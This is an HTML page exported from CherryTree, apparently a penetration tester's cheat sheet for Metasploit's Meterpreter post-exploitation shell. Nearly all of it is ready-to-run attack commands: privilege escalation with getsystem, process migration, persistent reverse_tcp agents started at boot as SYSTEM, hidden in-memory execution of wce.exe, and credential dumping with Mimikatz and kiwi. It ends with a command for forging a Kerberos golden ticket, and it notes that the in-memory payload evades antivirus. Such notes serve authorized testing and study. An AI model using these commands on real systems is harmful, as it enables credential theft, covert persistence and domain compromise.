<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Meterpreter</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Meterpreter</h1></strong><br /><a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/">https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/</a><br /><br />Meterpreter is a metasploit shell that provides an interactive shell on the target with extra functionality:<br />file upload, file download, keyloggers, hash extraction etc.<br /><br />It can be delivered staged, or non-staged (as 1 file).<br />Most of them it&#39;s delivered staged.<br />• The 1st stage downloads Meterpreter.<br />• The 2nd stage is a 750kb DLL file that gets injected directly into memory. <br />   ◇ Since the DLL file never touches the victim file system, it&#39;s less likely to be detected by antivirus software<br /><br /><code>help</code> - list all the available commands<br /><code>sysinfo</code> - get system info (useful to do first)<br /><code>getuid</code> - get user id<br /><code>search -f *pass*.txt</code> - search for .txt files with the phrase ‘pass’ in their name<br /><code>getsystem</code> - try to priv-esc to root/admin via common methods<br /><br /><code>shell</code> - Drops you into a shell on the system<br /><code>load powershell</code> &gt; <code>powershell</code> &gt; <code>powershell_shell</code>  - Drop into a powershell shell<br /><br /><strong><h2>## Migrate to 64bit Process</h2></strong><br />1. List processes to find a 64bit process<br /><code>ps</code><br /><br />    <code>0</code> is fine<br />    <code>1</code> means the process in interactive (which gives you a few more permission)<br /><br />2. Migrate to the process<br /><code>migrate &lt;pid&gt;</code><br /><br />3. Verify you&#39;re now on a 64bit meterpreter seession<br /><code>sysinfo</code><br /><br /><strong><h2>## Persistence</h2></strong><br /><code>-A </code>            Automatically start a matching exploit/multi/handler to connect to the agent<br /><code>-L &lt;opt&gt;</code>  Location in target host to write payload to, if none %TEMP% will be used.<br /><code>-P &lt;opt&gt;</code>  Payload to use, default is windows/meterpreter/reverse_tcp.<br /><code>-S</code>              Automatically start the agent on boot as a service (with SYSTEM privileges)<br /><code>-T &lt;opt&gt;</code>  Alternate executable template to use<br /><code>-U</code>              Automatically start the agent when the User logs on<br /><code>-X</code>              Automatically start the agent when the system boots<br /><code>-h</code>              This help menu<br /><code>-i &lt;opt&gt;</code>  The interval in seconds between each connection attempt<br /><code>-p &lt;opt&gt;</code>  The port on which the system running Metasploit is listening<br /><code>-r &lt;opt&gt;</code>  The IP of the system running Metasploit listening for the connect back<br /><br /><code>run persistence -U -p 4242</code><br /><br /><strong><h2>## Network Monitoring</h2></strong><br /><code>run packetrecorder -li</code> - list interfaces<br /><code>run packetrecorder -i 1</code> - record interface 1<br /><br /><strong><h2>## Port Forward</h2></strong><br /><code>portfwd add -l 7777 -r 172.17.0.2 -p 3006</code><br /><br /><strong><h2>## Upload &amp; Download</h2></strong><br /><code>upload /path/in/hdd/payload.exe exploit.exe</code><br /><code>download /path/in/victim</code><br /><br /><strong><h2>## Execute from Memory</h2></strong><br /><code>execute -H -i -c -m -d calc.exe -f /root/wce.exe -a -w</code><br /><br /><strong><h2>## Mimikatz</h2></strong><br /><code>load mimikatz<br />mimikatz_command -f version<br />mimikatz_command -f samdump::hashes<br />mimikatz_command -f sekurlsa::wdigest<br />mimikatz_command -f sekurlsa::searchPasswords<br />mimikatz_command -f sekurlsa::logonPasswords full<br /><br />load kiwi<br />creds_all<br />golden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;</code><br /><br /></div>
</body>
</html>
